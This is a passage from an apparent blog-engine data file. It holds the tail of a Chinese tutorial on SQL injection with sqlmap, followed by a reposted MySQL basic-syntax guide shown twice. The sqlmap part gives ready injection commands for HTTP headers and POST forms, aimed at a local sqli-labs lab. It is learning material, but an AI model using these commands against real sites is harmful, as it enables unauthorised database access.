title=\"User-agent\"></a>User-agent</h3><p>后台SQL语句中使用了HTTP头中的<code>User-agent</code>字段中的数据</p>\n<pre><code>sqlmap &gt; py sqlmap.py -u “url” --dbs --level=3</code></pre><h3 id=\"Cookie\"><a href=\"#Cookie\" class=\"headerlink\" title=\"Cookie\"></a>Cookie</h3><p>后台SQL语句中使用了HTTP头中<code>Cookie</code>字段中的数据</p>\n<pre><code>sqlmap &gt; py sqlmap.py -u “url” --dbs --level=3</code></pre><h3 id=\"Refer\"><a href=\"#Refer\" class=\"headerlink\" title=\"Refer\"></a>Refer</h3><p>后台SQL语句中使用了HTTP头中的<code>Refer</code>字段中的数据</p>\n<pre><code>sqlmap &gt; py sqlmap.py -u “url” --dbs --level=3</code></pre><h3 id=\"Host\"><a href=\"#Host\" class=\"headerlink\" title=\"Host\"></a>Host</h3><p>后台SQL语句中使用了HTTP头中的<code>host</code>字段中的数据</p>\n<pre><code>sqlmap &gt; py sqlmap.py -u “url” --dbs --level=5</code></pre><p>以上几种注入漏洞的执行原理非常“普通”，只不过注入点位置特殊而已，熟练运用sqlmap工具即可轻松解决</p>\n<h2 id=\"POST注入\"><a href=\"#POST注入\" class=\"headerlink\" title=\"POST注入\"></a>POST注入</h2><p>上面的http头注入其实就是一种稍微特殊的post注入，<strong>post注入</strong>，顾名思义，就是注入点在post表单里的sql注入漏洞，一般手工注入需要借助工具（Burpsuite）抓包，然后修改post数据。</p>\n<p>利用sqlmap进行post注入有几种方式</p>\n<p><strong>1.普通的表单注入</strong></p>\n<p>在表单中，例如登陆页面，如果不知道哪个参数存在注入点，可以直接添加<code>--forms</code>命令参数</p>\n<pre><code>sqlmap &gt; py sqlmap.py -u “url” --forms --batch</code></pre><p><strong>2.带参数的表单注入</strong></p>\n<p>如果已知某个参数有注入漏洞，如”id=1&amp;time=2001”</p>\n<pre><code>sqlmap &gt; py sqlmap.py -u “url” --data “id=1&amp;time=2001” --batch</code></pre><p><strong>3.使用文件指定参数的表单（HTTP头）注入</strong></p>\n<p>比如已知注入点为id，在post表单中</p>\n<p>用Burpsuite抓包，把报头保存为<code>post.txt</code>，放在sqlmap同目录下（或者随便放哪，到时候带路径就行，懂得都懂）</p>\n<pre><code>sqlmap &gt; py sqlmap.py -r post.txt -p id --dbs --batch     //用-p参数指定注入点\n或者\nsqlmap &gt; py sqlmap.py -r post.txt --level=3 --batch     //指定探测级别，level 3级别就会自动探测http头</code></pre><p>要在http头中进行注入，只要在需要探测的字段后面添加一个<code>*</code>号，sqlmap就会自动对其进行探测了，如Referer注入就在Referer字段后面添加一个<code>*</code>号。</p>\n<pre><code>Referer: http://127.0.0.1/sqli/Less-19/*</code></pre><p><strong>4.使用Burpsuite带sqlmap插件注入</strong></p>\n<p>很简单，bp上配置好sqlmap插件后，右键，发送到sqlmap，然后流程和上面差不多，添加*号，或者指定参数。</p>\n<h2 id=\"GET报错注入\"><a href=\"#GET报错注入\" class=\"headerlink\" title=\"GET报错注入\"></a>GET报错注入</h2>"},{"layout":"post","title":"MYSQL常用基础语法","date":"2021-01-20T16:00:00.000Z","description":"CSDN上Younger_zeng大佬详细记录的MYSQL常用基础语法，整理的太好，搬运一下方便自用","typora-copy-images-to":"..\\img","typora-root-url":"..","_content":"\n## MySQL常用基础语法\n\nYounger_zeng 2018-08-02 17:20:23  https://blog.csdn.net/qq_36969257/article/details/81364113\n\n\n# MySQL语法\n\n[TOC]\n\n\n\n    MySQL语法\n            启动和关闭\n            分类：\n            数据类型\n            DDL\n            DML\n            DCL\n            DQL\n                    条件查询\n                    模糊查询\n                    字段控制查询\n                    排序\n                    聚合函数\n                    分组(GROUP BY)查询\n                    HAVING子句\n                    LIMIT\n            完整性约束\n            MySQL数据库备份与还原\n            多表查询\n\n### 启动和关闭\n\n```mysql\n启动：net start mysql;\n关闭：net stop mysql;\n登录：mysql -u root -p 123 -h localhost；\n退出：quit;1234\n```\n\n### 分类：\n\n- DDL（Data Definition Language）：数据定义语言，用来定义数据库对象：库、表、列等； \n- DML（Data Manipulation Language）:数据操作语言，用来定义数据库记录（数据）；\n- DCL（Data Control Language）：数据控制语言，用来定义访问权限和安全级别；\n- DQL（Data Query Language）：数据查询语言，用来查询记录（数据）。\n\n### 数据类型\n\n### DDL\n\n```mysql\n查看所有数据库名称：SHOW DATABASES；\n切换数据库：USE mydb1;\n创建数据库：CREATE DATABASE [IF NOT EXISTS] mydb1；\n删除数据库：DROP DATABASE [IF EXISTS] mydb1；\n修改数据库编码：ALTER DATABASE mydb1 CHARACTER SET utf812345\n# 创建表\nCREATE TABLE stu(\n    sid     CHAR(6),\n    sname   VARCHAR(20),\n    age     INT,\n    gender  VARCHAR(10) \n);\n\nCREATE TABLE emp(\n    eid     CHAR(6),\n    ename   VARCHAR(50),\n    age     INT,\n    gender  VARCHAR(6),\n    birthday    DATE,\n    hiredate    DATE,\n    salary  DECIMAL(7,2),\n    resume  VARCHAR(1000)\n);123456789101112131415161718\n查看当前数据库中所有表名称：SHOW TABLES；\n查看指定表的创建语句：SHOW CREATE TABLE emp;\n查看表结构：DESC emp;\n删除表：DROP TABLE emp;\n修改表：\n# 1.修改之添加列：给stu表添加classname列：\n    ALTER TABLE stu ADD (classname varchar(100));\n# 2.修改之修改列类型：修改stu表的gender列类型为CHAR(2)：\n    ALTER TABLE stu MODIFY gender CHAR(2);\n# 3.修改之修改列名：修改stu表的gender列名为sex：\n    ALTER TABLE stu change gender sex CHAR(2);\n# 4.修改之删除列：删除stu表的classname列：\n    ALTER TABLE stu DROP classname;\n# 5.修改之修改表名称：修改stu表名称为student：\n    ALTER TABLE stu RENAME TO student;\n\n```\n\n### DML\n\n```mysql\n# 插入数据\nINSERT INTO stu(sid, sname) VALUES('s_1001', 'zhangSan');\nINSERT INTO stu VALUES('s_1002', 'liSi', 32, 'female');\n# 修改数据\nUPDATE stu SET sname=’liSi’, age=’20’ WHERE age>50 AND gender=’male’;\n# 删除数据\nDELETE FROM stu WHERE sname=’chenQi’ OR age > 30;\nDELETE FROM stu; \n# truncate 是先DROP TABLE，再CREATE TABLE。而且TRUNCATE删除的记录是无  法回滚的，但DELETE删除的记录是可以回滚的\nTRUNCATE TABLE stu;\n```\n\n### DCL\n\n```mysql\n# 创建用户: CREATE USER 用户名@地址 IDENTIFIED BY '密码';\nCREATE USER user1@localhost IDENTIFIED BY ‘123’; \nCREATE USER user2@’%’ IDENTIFIED BY ‘123’; \n# 给用户授权: GRANT 权限1, … , 权限n ON 数据库.* TO 用户名\nGRANT CREATE,ALTER,DROP,INSERT,UPDATE,DELETE,SELECT ON mydb1.* TO user1@localhost;\nGRANT ALL ON mydb1.* TO user2@localhost;\n# 撤销授权: REVOKE权限1, … , 权限n ON 数据库.* FORM 用户名\nREVOKE CREATE,ALTER,DROP ON mydb1.* FROM user1@localhost;\n# 查看用户权限:SHOW GRANTS FOR 用户名\nSHOW GRANTS FOR user1@localhost;\n# 删除用户:DROP USER 用户名\nDROP USER user1@localhost;\n# 修改用户密码\nUSE mysql;\nUPDATE USER SET PASSWORD=PASSWORD(‘密码’) WHERE User=’用户名’ and Host=’IP’;\nFLUSH PRIVILEGES;\n#------------------\nUPDATE USER SET PASSWORD=PASSWORD('1234') WHERE User='user2' and Host=’localhost’;\nFLUSH PRIVILEGES;\n\n\n```\n\n### DQL\n\n```mysql\n语法：\nSELECT selection_list /*要查询的列名称*/\n  FROM table_list /*要查询的表名称*/\n  WHERE condition /*行条件*/\n  GROUP BY grouping_columns /*对结果分组*/\n  HAVING condition /*分组后的行条件*/\n  ORDER BY sorting_columns /*对结果分组*/\n  LIMIT offset_start, row_count /*结果限定*/\n\n```\n\n##### 条件查询\n\n- =、!=、<>、<、<=、>、>=；\n- BETWEEN…AND；\n- IN(set)；\n- IS NULL；\n- AND；\n- OR；\n- NOT；\n\n```mysql\nSELECT * FROM stu \nWHERE sid IN ('S_1001','S_1002','S_1003');\nSELECT * FROM stu\nWHERE sname IS NOT NULL;\n\n```\n\n##### 模糊查询\n\n- “*_”:匹配任意一个字母，5个“*”表示5个任意字母 \n- “%”:匹配0~n个任何字母 “\n\n```mysql\n# 查询姓名中第2个字母为“i”的学生记录\nSELECT * FROM stu\nWHERE sname LIKE '_i%';\n```\n\n##### 字段控制查询\n\n- 去除重复记录 :distinct\n\n  `SELECT DISTINCT sal FROM emp;`\n\n- 给列名添加别名 \n\n  `SELECT *, sal+IFNULL(comm,0) AS total FROM emp;`\n\n##### 排序\n\n```mysql\nSELECT * FROM emp\nORDER BY sal DESC,empno ASC;\n```\n\n##### 聚合函数\n\n- COUNT()：统计指定列不为NULL的记录行数；\n- MAX()：计算指定列的最大值，是字符串类型，那么使用字符串排序运算；\n- MIN()：计算指定列的最小值，是字符串类型，那么使用字符串排序运算；\n- SUM()：计算指定列的数值和，不是数值类型，计算结果为0；\n- AVG()：计算指定列的平均值，不是数值类型，那么计算结果为0；\n\n##### 分组(GROUP BY)查询\n\n```mysql\nSELECT deptno,COUNT(*)\nFROM emp\nWHERE sal>1500\nGROUP BY deptno;\n```\n\n##### HAVING子句\n\n```mysql\nSELECT deptno, SUM(sal) FROM emp\nGROUP BY deptno\nHAVING SUM(sal) > 9000;\n#注：WHERE是对分组前记录的条件，如果某行记录没有满足WHERE子句的条件，那么这行记录不会参加分组；而HAVING是对分组后数据的约束\n```\n\n##### LIMIT\n\n> limit 起始行 , 查询行数 //起始行从0开始，为开区间\n\n```mysql\n# 查询从第四行开始的10行记录\nSELECT * FROM emp LIMIT 3, 10;\n```\n\n### 完整性约束\n\n1. 主键 ：primary key\n\n   - 创建表：定义列时指定主键\n\n   - 创建表：定义列之后独立指定主键\n\n   - 修改表时指定主键\n\n     `ALTER TABLE stu ADD PRIMARY KEY(sid);`\n\n   - 删除主键 \n\n     `ALTER TABLE stu DROP PRIMARY KEY;`\n\n2. 主键自增长 ：auto_increment（主键必须是整型才可以自增长） \n\n   - 创建表时设置主键自增长\n\n     ```mysql\n     CREATE TABLE stu(\n         sid INT PRIMARY KEY AUTO_INCREMENT,\n         sname   VARCHAR(20),\n         age     INT,\n         gender  VARCHAR(10)\n     );\n     ```\n\n   - 修改表时设置主键自增长 \n\n     `ALTER TABLE stu CHANGE sid sid INT AUTO_INCREMENT;`\n\n   - 修改表时删除主键自增长\n\n     `ALTER TABLE stu CHANGE sid sid INT;`\n\n3. 非空：NOT NULL\n\n   > 字段设为非空后，插入记录时必须给值\n\n4. 唯一：UNIQUE\n\n   > 字段指定唯一约束后，字段的值必须是唯一的 \n\n5. 外键\n\n   > 外键是另一张表的主键 ！！\n   >\n   > 外键就是用来约束这一列的值必须是另一张表的主键值！!\n\n   ```mysql\n   # 创建表时设置外键\n   \n   CREATE TABLE t_section(\n       sid INT PRIMARY KEY AUTO_INCREMENT,\n       sname   VARCHAR(30),\n       u_id    INT,\n       CONSTRAINT fk_t_user FOREIGN KEY(u_id) REFERENCES t_user(uid)\n   );\n   \n   # 修改表时设置外键\n   \n   ALTER TABLE t_session\n   ADD CONSTRAINT fk_t_user\n   FOREIGN KEY(u_id)\n   REFERENCES t_user(uid);\n   \n   # 修改表时删除外键\n   \n   ALTER TABLE t_section\n   DROP FOREIGN KEY fk_t_user;\n   ```\n\n### MySQL数据库备份与还原\n\n1. 生成SQL脚本 (备份)\n\n   > 脚本文本中只包含数据库的内容，而不会存在创建数据库的语句!\n   >\n   > 在未登录mysql状态下：\n   >\n   > mysqldump –u 用户名 –p 密码 数据库名>生成的脚本文件路径`mysqldump -uroot -p123456 javaclass>E:\\javaclass.sql`\n\n2. 执行SQL脚本 \n\n   > 执行SQL脚本需要登录mysql，进入指定数据库，执行SQL脚本！`SOURCE E:\\javaclass.sql`\n   >\n   > 无需登录mysql\n   >\n   > mysql –u用户名 –p密码 数据库<要执行脚本文件路径 :\n   >\n   > `mysql -uroot -p123456 javaclass<E:\\javaclass.sql`\n\n### 多表查询\n\n- 合并结果集\n- 连接查询 \n  1. 内连接\n  2. 外连接 \n     1. 左外连接\n     2. 右外连接\n     3. 全外连接（MYSQL不支持）\n  3. 自然连接\n- 子查询\n\n------\n\n**合并结果集**\n\n- UNION：去除重复记录 `SELECT * FROM t1 UNION SELECT * FROM t2；` \n- UNION ALL:不去除重复记录`SELECT * FROM t1 UNION ALL SELECT * FROM t2;`\n\n**连接查询**\n\n*内连接*：\n\n```mysql\n# 方言版\nSELECT e.ename,e.sal,e.comm,d.dname \nFROM emp AS e,dept AS d\nWHERE e.deptno=d.deptno;\n# 标准版\nSELECT * \nFROM emp e \nINNER JOIN dept d \nON e.deptno=d.deptno;\n```\n\n*左连接*：\n\n```mysql\nSELECT * FROM emp e \nLEFT OUTER JOIN dept d \nON e.deptno=d.deptno;123\n```\n\n*右连接*:\n\n```mysql\nSELECT * FROM emp e \nRIGHT OUTER JOIN dept d \nON e.deptno=d.deptno;\n```\n\n*自然连接*:\n\n```mysql\nSELECT * FROM emp NATURAL JOIN dept;\nSELECT * FROM emp NATURAL LEFT JOIN dept;\nSELECT * FROM emp NATURAL RIGHT JOIN dept;\n```\n\n**子查询**\n\n> 嵌套查询，即SELECT中包含SELECT，如果一条语句中存在两个，或两个以上SELECT，那么就是子查询语句了。 \n>\n> 子查询出现的位置：\n>\n> - where后，作为条件的一部分 \n> - from后，作为被查询的一条表","source":"_posts/2021-1-21-MYSQL常用基础语法.md","raw":"---\nlayout: post\ntitle:  MYSQL常用基础语法\ndate: 2021-1-21\ncategories: blog\ntags: [web，mysql]\ndescription: CSDN上Younger_zeng大佬详细记录的MYSQL常用基础语法，整理的太好，搬运一下方便自用\ntypora-copy-images-to: ..\\img\ntypora-root-url: ..\n---\n\n## MySQL常用基础语法\n\nYounger_zeng 2018-08-02 17:20:23  https://blog.csdn.net/qq_36969257/article/details/81364113\n\n\n# MySQL语法\n\n[TOC]\n\n\n\n    MySQL语法\n            启动和关闭\n            分类：\n            数据类型\n            DDL\n            DML\n            DCL\n            DQL\n                    条件查询\n                    模糊查询\n                    字段控制查询\n                    排序\n                    聚合函数\n                    分组(GROUP BY)查询\n                    HAVING子句\n                    LIMIT\n            完整性约束\n            MySQL数据库备份与还原\n            多表查询\n\n### 启动和关闭\n\n```mysql\n启动：net start mysql;\n关闭：net stop mysql;\n登录：mysql -u root -p 123 -h localhost；\n退出：quit;1234\n```\n\n### 分类：\n\n- DDL（Data Definition Language）：数据定义语言，用来定义数据库对象：库、表、列等； \n- DML（Data Manipulation Language）:数据操作语言，用来定义数据库记录（数据）；\n- DCL（Data Control Language）：数据控制语言，用来定义访问权限和安全级别；\n- DQL（Data Query Language）：数据查询语言，用来查询记录（数据）。\n\n### 数据类型\n\n### DDL\n\n```mysql\n查看所有数据库名称：SHOW DATABASES；\n切换数据库：USE mydb1;\n创建数据库：CREATE DATABASE [IF NOT EXISTS] mydb1；\n删除数据库：DROP DATABASE [IF EXISTS] mydb1；\n修改数据库编码：ALTER DATABASE mydb1 CHARACTER SET utf812345\n# 创建表\nCREATE TABLE stu(\n    sid     CHAR(6),\n    sname   VARCHAR(20),\n    age     INT,\n    gender  VARCHAR(10) \n);\n\nCREATE TABLE emp(\n    eid     CHAR(6),\n    ename   VARCHAR(50),\n    age     INT,\n    gender  VARCHAR(6),\n    birthday    DATE,\n    hiredate    DATE,\n    salary  DECIMAL(7,2),\n    resume  VARCHAR(1000)\n);123456789101112131415161718\n查看当前数据库中所有表名称：SHOW TABLES；\n查看指定表的创建语句：SHOW CREATE TABLE emp;\n查看表结构：DESC emp;\n删除表：DROP TABLE emp;\n修改表：\n# 1.修改之添加列：给stu表添加classname列：\n    ALTER TABLE stu ADD (classname varchar(100));\n# 2.修改之修改列类型：修改stu表的gender列类型为CHAR(2)：\n    ALTER TABLE stu MODIFY gender CHAR(2);\n# 3.修改之修改列名：修改stu表的gender列名为sex：\n    ALTER TABLE stu change gender sex CHAR(2);\n# 4.修改之删除列：删除stu表的classname列：\n    ALTER TABLE stu DROP classname;\n# 5.修改之修改表名称：修改stu表名称为student：\n    ALTER TABLE stu RENAME TO student;\n\n```\n\n### DML\n\n```mysql\n# 插入数据\nINSERT INTO stu(sid, sname) VALUES('s_1001', 'zhangSan');\nINSERT INTO stu VALUES('s_1002', 'liSi', 32, 'female');\n# 修改数据\nUPDATE stu SET sname=’liSi’, age=’20’ WHERE age>50 AND gender=’male’;\n# 删除数据\nDELETE FROM stu WHERE sname=’chenQi’ OR age > 30;\nDELETE FROM stu; \n# truncate 是先DROP TABLE，再CREATE TABLE。而且TRUNCATE删除的记录是无  法回滚的，但DELETE删除的记录是可以回滚的\nTRUNCATE TABLE stu;\n```\n\n### DCL\n\n```mysql\n# 创建用户: CREATE USER 用户名@地址 IDENTIFIED BY '密码';\nCREATE USER user1@localhost IDENTIFIED BY ‘123’; \nCREATE USER user2@’%’ IDENTIFIED BY ‘123’; \n# 给用户授权: GRANT 权限1, … , 权限n ON 数据库.* TO 用户名\nGRANT CREATE,ALTER,DROP,INSERT,UPDATE,DELETE,SELECT ON mydb1.* TO user1@localhost;\nGRANT ALL ON mydb1.* TO user2@localhost;\n# 撤销授权: REVOKE权限1, … , 权限n ON 数据库.* FORM 用户名\nREVOKE CREATE,ALTER,DROP ON mydb1.* FROM user1@localhost;\n# 查看用户权限:SHOW GRANTS FOR 用户名\nSHOW GRANTS FOR user1@localhost;\n# 删除用户:DROP USER 用户名\nDROP USER user1@localhost;\n# 修改用户密码\nUSE mysql;\nUPDATE USER SET PASSWORD=PASSWORD(‘密码’) WHERE User=’用户名’ and Host=’IP’;\nFLUSH PRIVILEGES;\n#------------------\nUPDATE USER SET PASSWORD=PASSWORD('1234') WHERE User='user2' and Host=’localhost’;\nFLUSH PRIVILEGES;\n\n\n```\n\n### DQL\n\n```mysql\n语法：\nSELECT selection_list /*要查询的列名称*/\n  FROM table_list /*要查询的表名称*/\n  WHERE condition /*行条件*/\n  GROUP BY grouping_columns /*对结果分组*/\n  HAVING condition /*分组后的行条件*/\n  ORDER BY sorting_columns /*对结果分组*/\n  LIMIT offset_start, row_count /*结果限定*/\n\n```\n\n##### 条件查询\n\n- =、!=、<>、<、<=、>、>=；\n- BETWEEN…AND；\n- IN(set)；\n- IS NULL；\n- AND；\n- OR；\n- NOT；\n\n```mysql\nSELECT * FROM stu \nWHERE sid IN ('S_1001','S_1002','S_1003');\nSELECT * FROM stu\nWHERE sname IS NOT NULL;\n\n```\n\n##### 模糊查询\n\n- “*_”:匹配任意一个字母，5个“*”表示5个任意字母 \n- “%”:匹配0~n个任何字母 “\n\n```mysql\n# 查询姓名中第2个字母为“i”的学生记录\nSELECT * FROM stu\nWHERE sname LIKE '_i%';\n```\n\n##### 字段控制查询\n\n- 去除重复记录 :distinct\n\n  `SELECT DISTINCT sal FROM emp;`\n\n- 给列名添加别名 \n\n  `SELECT *, sal+IFNULL(comm,0) AS total FROM emp;`\n\n##### 排序\n\n```mysql\nSELECT * FROM emp\nORDER BY sal DESC,empno ASC;\n```\n\n##### 聚合函数\n\n- COUNT()：统计指定列不为NULL的记录行数；\n- MAX()：计算指定列的最大值，是字符串类型，那么使用字符串排序运算；\n- MIN()：计算指定列的最小值，是字符串类型，那么使用字符串排序运算；\n- SUM()：计算指定列的数值和，不是数值类型，计算结果为0；\n- AVG()：计算指定列的平均值，不是数值类型，那么计算结果为0；\n\n##### 分组(GROUP BY)查询\n\n```mysql\nSELECT deptno,COUNT(*)\nFROM emp\nWHERE sal>1500\nGROUP BY deptno;\n```\n\n##### HAVING子句\n\n```mysql\nSELECT deptno, SUM(sal) FROM emp\nGROUP BY deptno\nHAVING SUM(sal) > 9000;\n#注：WHERE是对分组前记录的条件，如果某行记录没有满足WHERE子句的条件，那么这行记录不会参加分组；而HAVING是对分组后数据的约束\n```\n\n##### LIMIT\n\n> limit 起始行 , 查询行数 //起始行从0开始，为开区间\n\n```mysql\n# 查询从第四行开始的10行记录\nSELECT * FROM emp LIMIT 3, 10;\n```\n\n### 完整性约束\n\n1. 主键 ：primary key\n\n   - 创建表：定义列时指定主键\n\n   - 创建表：定义列之后独立指定主键\n\n   - 修改表时指定主键\n\n     `ALTER TABLE stu ADD PRIMARY KEY(sid);`\n\n   - 删除主键 \n\n     `ALTER TABLE stu DROP PRIMARY KEY;`\n\n2. 主键自增长 ：auto_increment（主键必须是整型才可以自增长） \n\n   - 创建表时设置主键自增长\n\n     ```mysql\n     CREATE TABLE stu(\n         sid INT PRIMARY KEY AUTO_INCREMENT,\n         sname   VARCHAR(20),\n         age     INT,\n         gender  VARCHAR(10)\n     );\n     ```\n\n   - 修改表时设置主键自增长 \n\n     `ALTER TABLE stu CHANGE sid sid INT AUTO_INCREMENT;`\n\n   - 修改表时删除主键自增长\n\n     `ALTER TABLE stu CHANGE sid sid INT;`\n\n3. 非空：NOT NULL\n\n   > 字段设为非空后，插入记录时必须给值\n\n4. 唯一：UNIQUE\n\n   > 字段指定唯一约束后，字段的值必须是唯一的 \n\n5. 外键\n\n   > 外键是另一张表的主键 ！！\n   >\n   > 外键就是用来约束这一列的值必须是另一张表的主键值！!\n\n   ```mysql\n   # 创建表时设置外键\n   \n   CREATE TABLE t_section(\n       sid INT PRIMARY KEY AUTO_INCREMENT,\n       sname   VARCHAR(30),\n       u_id    INT,\n       CONSTRAINT fk_t_user FOREIGN KEY(u_id) REFERENCES t_user(uid)\n   );\n   \n   # 修改表时设置外键\n   \n   ALTER TABLE t_session\n   ADD CONSTRAINT fk_t_user\n   FOREIGN KEY(u_id)\n   REFERENCES t_user(uid);\n   \n   # 修改表时删除外键\n   \n   ALTER TABLE t_section\n   DROP FOREIGN KEY fk_t_user;\n   ```\n\n### MySQL数据库备份与还原\n\n1. 生成SQL脚本 (备份)\n\n   > 脚本文本中只包含数据库的内容，而不会存在创建数据库的语句!\n   >\n   > 在未登录mysql状态下：\n   >\n   > mysqldump –u 用户名 –p 密码 数据库名>生成的脚本文件路径`mysqldump -uroot -p123456 javaclass>E:\\javaclass.sql`\n\n2. 执行SQL脚本 \n\n   > 执行SQL脚本需要登录mysql，进入指定数据库，执行SQL脚本！`SOURCE E:\\javaclass.sql`\n   >\n   > 无需登录mysql\n   >\n   > mysql –u用户名 –p密码 数据库<要执行脚本文件路径 :\n   >\n   > `mysql -uroot -p123456 javaclass<E:\\javaclass.sql`\n\n### 多表查询\n\n- 合并结果集\n- 连接查询 \n  1. 内连接\n  2. 外连接 \n     1. 左外连接\n     2. 右外连接\n     3. 全外连接（MYSQL不支持）\n  3. 自然连接\n- 子查询\n\n------\n\n**合并结果集**\n\n- UNION：去除重复记录 `SELECT * FROM t1 UNION SELECT * FROM t2；` \n- UNION ALL:不去除重复记录`SELECT * FROM t1 UNION ALL SELECT * FROM t2;`\n\n**连接查询**\n\n*内连接*：\n\n```mysql\n# 方言版\nSELECT e.ename,e.sal,e.comm,d.dname \nFROM emp AS e,dept AS d\nWHERE e.deptno=d.deptno;\n# 标准版\nSELECT * \nFROM emp e \nINNER JOIN dept d \nON e.deptno=d.deptno;\n```\n\n*左连接*：\n\n```mysql\nSELECT * FROM emp e \nLEFT OUTER JOIN dept d \nON e.deptno=d.deptno;123\n```\n\n*右连接*:\n\n```mysql\nSELECT * FROM emp e \nRIGHT OUTER JOIN dept d \nON e.deptno=d.deptno;\n```\n\n*自然连接*:\n\n```mysql\nSELECT * FROM emp NATURAL JOIN dept;\nSELECT * FROM emp NATURAL LEFT JOIN dept;\nSELECT * FROM emp NATURAL RIGHT JOIN dept;\n```\n\n**子查询**\n\n> 嵌套查询，即SELECT中包含SELECT，如果一条语句中存在两个，或两个以上SELECT，那么就是子查询语句了。 \n>\n> 子查询出现的位置：\n>\n> - where后，作为条件的一部分 \n> - from后，作为被查询的一条表","slug":"2021-1-21-MYSQL常用基础语法","published":1,"updated":"2021-01-21T15:03:07.554Z","comments":1,"photos":[],"link":"","_id":"ckkntx9kq002wxov7q8b18qeu","content":"<h2 id=\"MySQL常用基础语法\"><a href=\"#MySQL常用基础语法\" class=\"headerlink\" title=\"MySQL常用基础语法\"></a>MySQL常用基础语法</h2><p>Younger_zeng 2018-08-02 17:20:23  <a href=\"https://blog.csdn.net/qq_36969257/article/details/81364113\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/qq_36969257/article/details/81364113</a></p>\n<h1 id=\"MySQL语法\"><a href=\"#MySQL语法\" class=\"headerlink\" title=\"MySQL语法\"></a>MySQL语法</h1><p>[TOC]</p>\n<pre><code>MySQL语法\n        启动和关闭\n        分类：\n        数据类型\n        DDL\n        DML\n        DCL\n        DQL\n                条件查询\n                模糊查询\n                字段控制查询\n                排序\n                聚合函数\n                分组(GROUP BY)查询\n                HAVING子句\n                LIMIT\n        完整性约束\n        MySQL数据库备份与还原\n        多表查询</code></pre><h3 id=\"启动和关闭\"><a href=\"#启动和关闭\" class=\"headerlink\" title=\"启动和关闭\"></a>启动和关闭</h3><pre class=\"line-numbers language-mysql\"><code class=\"language-mysql\">启动：net start mysql;\n关闭：net stop mysql;\n登录：mysql -u root -p 123 -h localhost；\n退出：quit;1234<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"分类：\"><a href=\"#分类：\" class=\"headerlink\" title=\"分类：\"></a>分类：</h3><ul>\n<li>DDL（Data Definition Language）：数据定义语言，用来定义数据库对象：库、表、列等； </li>\n<li>DML（Data Manipulation Language）:数据操作语言，用来定义数据库记录（数据）；</li>\n<li>DCL（Data Control Language）：数据控制语言，用来定义访问权限和安全级别；</li>\n<li>DQL（Data Query Language）：数据查询语言，用来查询记录（数据）。</li>\n</ul>\n<h3 id=\"数据类型\"><a href=\"#数据类型\" class=\"headerlink\" title=\"数据类型\"></a>数据类型</h3><h3 id=\"DDL\"><a href=\"#DDL\" class=\"headerlink\" title=\"DDL\"></a>DDL</h3><pre class=\"line-numbers language-mysql\"><code class=\"language-mysql\">查看所有数据库名称：SHOW DATABASES；\n切换数据库：USE mydb1;\n创建数据库：CREATE DATABASE [IF NOT EXISTS] mydb1；\n删除数据库：DROP DATABASE [IF EXISTS] mydb1；\n修改数据库编码：ALTER DATABASE mydb1 CHARACTER SET utf812345\n# 创建表\nCREATE TABLE stu(\n    sid     CHAR(6),\n    sname   VARCHAR(20),\n    age     INT,\n    gender  VARCHAR(10) \n);\n\nCREATE TABLE emp(\n    eid     CHAR(6),\n    ename   VARCHAR(50),\n    age     INT,\n    gender  VARCHAR(6),\n    birthday    DATE,\n    hiredate    DATE,\n    salary  DECIMAL(7,2),\n    resume  VARCHAR(1000)\n);123456789101112131415161718\n查看当前数据库中所有表名称：SHOW TABLES；\n查看指定表的创建语句：SHOW CREATE TABLE emp;\n查看表结构：DESC emp;\n删除表：DROP TABLE emp;\n修改表：\n# 1.修改之添加列：给stu表添加classname列：\n    ALTER TABLE stu ADD (classname varchar(100));\n# 2.修改之修改列类型：修改stu表的gender列类型为CHAR(2)：\n    ALTER TABLE stu MODIFY gender CHAR(2);\n# 3.修改之修改列名：修改stu表的gender列名为sex：\n    ALTER TABLE stu change gender sex CHAR(2);\n# 4.修改之删除列：删除stu表的classname列：\n    ALTER TABLE stu DROP classname;\n# 5.修改之修改表名称：修改stu表名称为student：\n    ALTER TABLE stu RENAME TO student;\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"DML\"><a href=\"#DML\" class=\"headerlink\" title=\"DML\"></a>DML</h3><pre class=\"line-numbers language-mysql\"><code class=\"language-mysql\"># 插入数据\nINSERT INTO stu(sid, sname) VALUES('s_1001', 'zhangSan');\nINSERT INTO stu VALUES('s_1002', 'liSi', 32, 'female');\n# 修改数据\nUPDATE stu SET sname=’liSi’, age=’20’ WHERE age>50 AND gender=’male’;\n# 删除数据\nDELETE FROM stu WHERE sname=’chenQi’ OR age > 30;\nDELETE FROM stu; \n# truncate 是先DROP TABLE，再CREATE TABLE。而且TRUNCATE删除的记录是无  法回滚的，但DELETE删除的记录是可以回滚的\nTRUNCATE TABLE stu;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"DCL\"><a href=\"#DCL\" class=\"headerlink\" title=\"DCL\"></a>DCL</h3><pre class=\"line-numbers language-mysql\"><code class=\"language-mysql\"># 创建用户: CREATE USER 用户名@地址 IDENTIFIED BY '密码';\nCREATE USER user1@localhost IDENTIFIED BY ‘123’; \nCREATE USER user2@’%’ IDENTIFIED BY ‘123’; \n# 给用户授权: GRANT 权限1, … , 权限n ON 数据库.* TO 用户名\nGRANT CREATE,ALTER,DROP,INSERT,UPDATE,DELETE,SELECT ON mydb1.* TO user1@localhost;\nGRANT ALL ON mydb1.* TO user2@localhost;\n# 撤销授权: REVOKE权限1, … , 权限n ON 数据库.* FORM 用户名\nREVOKE CREATE,ALTER,DROP ON mydb1.* FROM user1@localhost;\n# 查看用户权限:SHOW GRANTS FOR 用户名\nSHOW GRANTS FOR user1@localhost;\n# 删除用户:DROP USER 用户名\nDROP USER user1@localhost;\n# 修改用户密码\nUSE mysql;\nUPDATE USER SET PASSWORD=PASSWORD(‘密码’) WHERE User=’用户名’ and Host=’IP’;\nFLUSH PRIVILEGES;\n#------------------\nUPDATE USER SET PASSWORD=PASSWORD('1234') WHERE User='user2' and Host=’localhost’;\nFLUSH PRIVILEGES;\n\n<span aria-hidden=\"true\" 